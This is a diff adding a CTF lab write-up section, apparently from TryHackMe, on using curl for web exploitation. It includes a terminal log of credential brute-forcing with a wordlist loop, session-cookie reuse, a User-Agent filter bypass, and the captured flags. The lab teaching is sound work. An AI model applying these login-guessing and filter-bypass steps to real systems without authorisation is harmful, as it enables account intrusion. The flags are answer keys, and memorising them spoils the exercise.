@@ -436,3 +436,75 @@ Flag 2: `THM{Evil_Stored_Egg}`
 
 ***
 
+# Day 24: Exploitation with Curl
+
+`curl` is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.
+
+```bash
+root@ip-10-49-139-217:~# curl http://10.49.155.124/
+Welcome to the cURL practice server!
+Try sending a POST request to /post.php
+root@ip-10-49-139-217:~# curl -X POST -d "username=user&password=user" http://10.49.155.124/post.php
+Invalid credentials.
+root@ip-10-49-139-217:~#  curl -i -X POST -d "username=user&password=user" http://10.49.155.124/post.php
+HTTP/1.1 200 OK
+Date: Sat, 27 Dec 2025 16:12:37 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 21
+Content-Type: text/html; charset=UTF-8
+
+Invalid credentials.
+root@ip-10-49-139-217:~#  curl -c cookies.txt -d "username=admin&password=admin" http://10.49.155.124/session.php
+Invalid credentials.
+root@ip-10-49-139-217:~# nano passwords.txt
+root@ip-10-49-139-217:~# cat passwords.txt
+admin123
+
+password
+
+letmein
+
+secretpass
+
+secret
+root@ip-10-49-139-217:~# nano loop.sh
+root@ip-10-49-139-217:~# chmod +x loop.sh
+root@ip-10-49-139-217:~# ./loop.sh
+Trying password: admin123
+Trying password: password
+Trying password: letmein
+Trying password: secretpass
+[+] Password found: secretpass
+root@ip-10-49-139-217:~# curl -c cookies.txt -d "username=admin&password=admin" http://10.49.155.124/session.php
+Invalid credentials.
+root@ip-10-49-139-217:~# curl -c cookies.txt -d "username=admin&password=admin" http://10.49.155.124/cookie.php
+Login successful. Cookie set.
+root@ip-10-49-139-217:~#  curl -b cookies.txt http://10.49.155.124/session.php
+Welcome back, user!
+root@ip-10-49-139-217:~#  curl -b cookies.txt http://10.49.155.124/cookie.php
+Welcome back, admin!
+Flag: THM{session_cookie_master}
+root@ip-10-49-139-217:~#  curl -X POST -d "username=user&password=user" http://10.49.155.124/post.php
+Invalid credentials.
+root@ip-10-49-139-217:~#  curl -X POST -d "username=admin&password=admin" http://10.49.155.124/post.php
+Login successful!
+Flag: THM{curl_post_success}
+root@ip-10-49-139-217:~# ^C
+root@ip-10-49-139-217:~# curl -i -A "TBFC" http://10.49.155.124/ua_check.php
+HTTP/1.1 403 Forbidden
+Date: Sat, 27 Dec 2025 16:21:58 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 55
+Content-Type: text/html; charset=UTF-8
+
+Blocked: Only internalcomputer useragents are allowed.
+root@ip-10-49-139-217:~# curl -i -A "TBFC" http://10.49.155.124/agent.php
+HTTP/1.1 200 OK
+Date: Sat, 27 Dec 2025 16:22:19 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 38
+Content-Type: text/html; charset=UTF-8
+
+Flag: THM{user_agent_filter_bypassed}
+```
+
